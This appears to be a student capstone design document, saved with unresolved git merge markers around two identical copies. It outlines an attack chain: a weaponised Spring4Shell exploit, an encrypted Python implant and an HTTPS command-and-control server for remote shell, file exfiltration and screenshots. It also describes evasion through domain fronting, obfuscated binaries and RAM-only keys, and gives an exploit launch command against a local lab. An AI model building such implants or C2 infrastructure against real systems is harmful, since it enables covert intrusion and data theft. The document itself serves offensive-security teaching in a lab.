<<<<<<< HEAD
# Capstone C2 Chain – Design Overview

> **Purpose**   Explain how the exploit, implant, C2 server, and lab network fit together so that any team‑member—or grader—can follow the flow **without reading code first**.

---

## 1  Mission Goal
* _Initial Access_ – Weaponised Spring4Shell (CVE‑2022‑22965) on Tomcat 9/Spring 5.3.15.
* _Implant_ – Cross‑platform Python agent (PyInstaller‑packed) that answers JSON tasking.
* _Command & Control_ – HTTPS long‑poll, ECDH‑derived AES‑GCM encryption, domain‑frontable paths.
* _Effects_ – remote shell, file exfil, system screenshot.
* _Safety_ – self‑delete when:
  * kill‑switch task received, **or**
  * no C2 contact > 7 days.

---

## 2  Component Diagram
```
┌────────────┐              HTTPS+JSON              ┌─────────────┐
│  Operator  │ ←──────────── TLS 443 ─────────────→ │  Redirector │
│  Console   │              (edge/proxy)            └────┬────────┘
└────┬───────┘                                            │gRPC
     │SSH/VPN                                             ▼
┌────▼─────────┐   SQLite + Flask     ┌──────────┐   ┌───────────┐
│  C2 Server   │◄────────────────────►│  Queue   │…  │  Storage  │
└────┬───────┬─┘                      └──────────┘   └───────────┘
     │REST   │Pull every 30 s
┌────▼──────────────┐                Encrypted           
│  Implant Agent    │◄─────────────────────────────────────┐
│(on compromised VM)│ ─────────────────────────────────────►│
└───────────────────┘            Task / Result JSON         
```

---

## 3  Repository Structure (link‑back)
See **PROJECT_STRUCTURE.md** for a per‑file map.  The short version:

| Layer      | Folder     | Entrypoint             | Key Dependencies                   |
|------------|------------|------------------------|------------------------------------|
| Exploit    | `exploit/` | `stage0_exploit.py`    | `requests`, `argparse`             |
| Implant    | `implant/` | `implant.py`           | `common.protocol`, `pycryptodome`  |
| C2 Core    | `c2/`      | `c2_server.py`         | `Flask`, `sqlite3`, `cryptography` |
| Shared lib | `common/`  | `crypto_lib.py`        | `cryptography`                     |
| Docs       | `docs/`    | `design.md`, `slides/` | –––––––––––––––––––––––            |

---

## 4  Protocol Summary
```jsonc
{
  "id": "uuid4",          // correlates task & result
  "op": "exec",          // enum: exec, exfil, screenshot, kill
  "args": { "cmd": "whoami" },
  "ts": 1714070400,
  "sig": "base64-HMAC"     // over id|op|args using session key
}
```
* **Handshake** – implant POSTs its Curve25519 public key; server replies with its own + nonce.  Shared secret → HKDF → AES‑GCM key.
* **Transport** – long‑poll `POST /resources/<rand>/metrics` every 30 s; replies carry up to one task.  Results posted back to `/reports/`.

---

## 5  Threat Model & Defences
| Threat | Mitigation |
|--------|------------|
|Traffic inspection (IDS/IPS)|Domain‑frontable path & innocuous JSON; AES‑GCM hides payload length via  padding.|
|Attribution to operator|Cloud redirector contains no secrets; C2 Core only reachable via WireGuard.|
|Binary forensics|PyInstaller one‑file + string‑table XOR; compiled w/ `--key` so embedded code encrypted.|
|Key theft on disk|Session key lives only in RAM; private Curve key encrypted with machine‑specific hash & deleted on tear‑down.|
|Replay / task forgery|Per‑message nonce + HMAC inside AES‑GCM prevents replay.|

---

## 6  File‑header Comment Template
Every Python/JSP/Script file should start with:
```python
"""
<filename>
<one‑line purpose>

Part of the CS564 Spring 2025 Capstone · Jacob / <Teammate>
License: MIT (see root LICENSE)

Role in chain:
  – <exploit / implant / c2 / helper>
  – Invoked by: <who calls it>
  – Key secrets stored: <none OR list>
"""
```
Copy & paste, then fill the three bullets.

---

## 7  Testing Strategy
* `pytest tests/test_protocol.py` – handshake, encrypt/decrypt round‑trip.
* `pytest tests/test_exploit_e2e.py` – spin docker‑compose, run exploit, assert implant beacons.
* CI matrix = `ubuntu‑latest` + `macos‑latest`.

---

## 8  Build & Run Quick‑Start (mirrors README)
```bash
# 1. clone & bootstrap
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt

# 2. launch vulnerable lab + C2
./scripts/run_all.sh

# 3. fire exploit
python exploit/stage0_exploit.py --rhost 127.0.0.1 --lhost 127.0.0.1 --c2 https://127.0.0.1:5000
```

---
=======
# Capstone C2 Chain – Design Overview

> **Purpose**   Explain how the exploit, implant, C2 server, and lab network fit together so that any team‑member—or grader—can follow the flow **without reading code first**.

---

## 1  Mission Goal
* _Initial Access_ – Weaponised Spring4Shell (CVE‑2022‑22965) on Tomcat 9/Spring 5.3.15.
* _Implant_ – Cross‑platform Python agent (PyInstaller‑packed) that answers JSON tasking.
* _Command & Control_ – HTTPS long‑poll, ECDH‑derived AES‑GCM encryption, domain‑frontable paths.
* _Effects_ – remote shell, file exfil, system screenshot.
* _Safety_ – self‑delete when:
  * kill‑switch task received, **or**
  * no C2 contact > 7 days.

---

## 2  Component Diagram
```
┌────────────┐              HTTPS+JSON              ┌─────────────┐
│  Operator  │ ←──────────── TLS 443 ─────────────→ │  Redirector │
│  Console   │              (edge/proxy)            └────┬────────┘
└────┬───────┘                                            │gRPC
     │SSH/VPN                                             ▼
┌────▼─────────┐   SQLite + Flask     ┌──────────┐   ┌───────────┐
│  C2 Server   │◄────────────────────►│  Queue   │…  │  Storage  │
└────┬───────┬─┘                      └──────────┘   └───────────┘
     │REST   │Pull every 30 s
┌────▼──────────────┐                Encrypted           
│  Implant Agent    │◄─────────────────────────────────────┐
│(on compromised VM)│ ─────────────────────────────────────►│
└───────────────────┘            Task / Result JSON         
```

---

## 3  Repository Structure (link‑back)
See **PROJECT_STRUCTURE.md** for a per‑file map.  The short version:

| Layer      | Folder     | Entrypoint             | Key Dependencies                   |
|------------|------------|------------------------|------------------------------------|
| Exploit    | `exploit/` | `stage0_exploit.py`    | `requests`, `argparse`             |
| Implant    | `implant/` | `implant.py`           | `common.protocol`, `pycryptodome`  |
| C2 Core    | `c2/`      | `c2_server.py`         | `Flask`, `sqlite3`, `cryptography` |
| Shared lib | `common/`  | `crypto_lib.py`        | `cryptography`                     |
| Docs       | `docs/`    | `design.md`, `slides/` | –––––––––––––––––––––––            |

---

## 4  Protocol Summary
```jsonc
{
  "id": "uuid4",          // correlates task & result
  "op": "exec",          // enum: exec, exfil, screenshot, kill
  "args": { "cmd": "whoami" },
  "ts": 1714070400,
  "sig": "base64-HMAC"     // over id|op|args using session key
}
```
* **Handshake** – implant POSTs its Curve25519 public key; server replies with its own + nonce.  Shared secret → HKDF → AES‑GCM key.
* **Transport** – long‑poll `POST /resources/<rand>/metrics` every 30 s; replies carry up to one task.  Results posted back to `/reports/`.

---

## 5  Threat Model & Defences
| Threat | Mitigation |
|--------|------------|
|Traffic inspection (IDS/IPS)|Domain‑frontable path & innocuous JSON; AES‑GCM hides payload length via  padding.|
|Attribution to operator|Cloud redirector contains no secrets; C2 Core only reachable via WireGuard.|
|Binary forensics|PyInstaller one‑file + string‑table XOR; compiled w/ `--key` so embedded code encrypted.|
|Key theft on disk|Session key lives only in RAM; private Curve key encrypted with machine‑specific hash & deleted on tear‑down.|
|Replay / task forgery|Per‑message nonce + HMAC inside AES‑GCM prevents replay.|

---

## 6  File‑header Comment Template
Every Python/JSP/Script file should start with:
```python
"""
<filename>
<one‑line purpose>

Part of the CS564 Spring 2025 Capstone · Jacob / <Teammate>
License: MIT (see root LICENSE)

Role in chain:
  – <exploit / implant / c2 / helper>
  – Invoked by: <who calls it>
  – Key secrets stored: <none OR list>
"""
```
Copy & paste, then fill the three bullets.

---

## 7  Testing Strategy
* `pytest tests/test_protocol.py` – handshake, encrypt/decrypt round‑trip.
* `pytest tests/test_exploit_e2e.py` – spin docker‑compose, run exploit, assert implant beacons.
* CI matrix = `ubuntu‑latest` + `macos‑latest`.

---

## 8  Build & Run Quick‑Start (mirrors README)
```bash
# 1. clone & bootstrap
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt

# 2. launch vulnerable lab + C2
./scripts/run_all.sh

# 3. fire exploit
python exploit/stage0_exploit.py --rhost 127.0.0.1 --lhost 127.0.0.1 --c2 https://127.0.0.1:5000
```

---
>>>>>>> 1cdb7db12f4a3f70cf3ad0ae6c32187fc3938f1b
